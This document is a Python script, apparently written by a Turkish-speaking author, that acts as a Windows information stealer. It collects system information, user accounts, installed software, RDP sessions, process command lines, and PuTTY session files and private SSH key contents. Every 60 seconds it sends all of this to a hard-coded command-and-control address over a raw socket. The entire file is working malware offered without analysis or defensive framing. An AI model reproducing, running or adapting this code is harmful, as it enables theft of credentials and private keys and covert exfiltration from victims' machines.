import socket
import os
import subprocess
import glob
import wmi
import json
import time

def get_hostname():
    return os.environ["COMPUTERNAME"]

def get_os_info():
    return subprocess.check_output(["systeminfo"], encoding="cp850").strip()

def get_users():
    return subprocess.check_output(["net", "user"], encoding="cp850").strip()

def get_installed_software():
    return subprocess.check_output(["wmic", "product", "get", "name,version"]).decode("utf-8").strip()

def get_proxy_settings():
    return subprocess.check_output(["netsh", "winhttp", "show", "proxy"]).decode("utf-8").strip()

def get_putty_sessions():
    putty_sessions = glob.glob(os.path.join(os.environ["USERPROFILE"], "Documents", "putty", "sessions", "*.ppk"))
    return putty_sessions

def get_putty_session_contents():
    putty_sessions = get_putty_sessions()
    session_contents = []
    for session in putty_sessions:
        with open(session, 'r') as file:
            session_contents.append(file.read())
    return session_contents

def get_putty_ssh_keys():
    putty_ssh_keys = glob.glob(os.path.join(os.environ["USERPROFILE"], "Documents", "putty", "ssh", "*.ppk"))
    return putty_ssh_keys

def get_putty_ssh_key_contents():
    ssh_keys = get_putty_ssh_keys()
    ssh_key_contents = []
    for key in ssh_keys:
        with open(key, 'r') as file:
            ssh_key_contents.append(file.read())
    return ssh_key_contents

def get_rdp_sessions():
    return subprocess.check_output(["qwinsta"], encoding="cp850").splitlines()

def get_previous_commands():
    c = wmi.WMI()
    commands = []

    for process in c.Win32_Process():
        command_line = process.CommandLine
        if command_line and command_line.strip():
            commands.append(command_line)
            if len(commands) >= 10:
                break

    return commands

def send_data_to_c2(data):
    c2_server_ip = "192.168.147.131"
    c2_server_port = 4442

    try:
        serialized_data = json.dumps(data, indent=2, default=str).encode()
        total_sent = 0
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((c2_server_ip, c2_server_port))
            while total_sent < len(serialized_data):
                sent = s.send(serialized_data[total_sent:])
                if sent == 0:
                    raise RuntimeError("Socket connection broken")
                total_sent += sent
        print("Veriler C2 sunucusuna başarıyla gönderildi.")
    except Exception as e:
        print("Veri gönderme sırasında bir hata oluştu:", str(e))

def main():
    while True:
        collected_data = {
            "hostname": get_hostname(),
            "operating_system_information": get_os_info() + "\n\n\n",
            "list_of_users_on_the_machine": get_users() + "\n\n\n",
            "installed_software_inventory": get_installed_software(),
            "proxy_settings": get_proxy_settings(),
            "putty_sessions": get_putty_sessions(),
            "putty_session_contents": get_putty_session_contents(),
            "putty_ssh_keys": get_putty_ssh_keys(),
            "putty_ssh_key_contents": get_putty_ssh_key_contents(),
            "rdp_sessions": get_rdp_sessions(),
            "previous_commands": get_previous_commands()
        }
        send_data_to_c2(collected_data)
        time.sleep(60)  # 60 saniye bekle, daha sonra tekrar gönder

if __name__ == "__main__":
    main()